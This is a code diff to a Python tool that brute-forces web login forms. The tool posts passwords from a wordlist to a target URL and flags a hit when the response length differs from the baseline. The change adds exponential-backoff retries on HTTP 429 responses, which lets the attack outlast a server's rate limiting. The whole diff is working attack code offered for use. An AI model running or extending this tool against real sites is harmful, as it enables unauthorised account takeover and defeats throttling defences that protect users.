@@ -2,7 +2,7 @@
 import requests
 import argparse
 import sys
-
+import time
 
 random_user_agent = False
 
@@ -118,13 +118,30 @@ def bruteforce(url, username, wlist: list, ufield, pfield, headers=None):
     
     idx = 0
     if test_url(url, data):
+        last_timeout = 0
         default_len = calculate_length(url, data)
         for word in wlist:
             data[pfield] = word
             r = requests.post(url, data=data, headers=headers)
+            
+            while r.status_code == 429:
+                
+                timeout = last_timeout * 2 if last_timeout != 0 else 5
+                
+                print("[~] Error: Too many requests.")
+                print(f"Retrying in {timeout} seconds")
+                
+                time.sleep(timeout)
+                last_timeout = timeout
+                
+                r = requests.post(url, data=data, headers=headers)
+                
             if len(r.text) != default_len:
+                
                 print(f"[~] PASSWORD FOUND : {word}")
                 break
+            
+            last_timeout = 0
         print("[~] Done")
     else:
         print("[~] URL can't be bruteforced.")
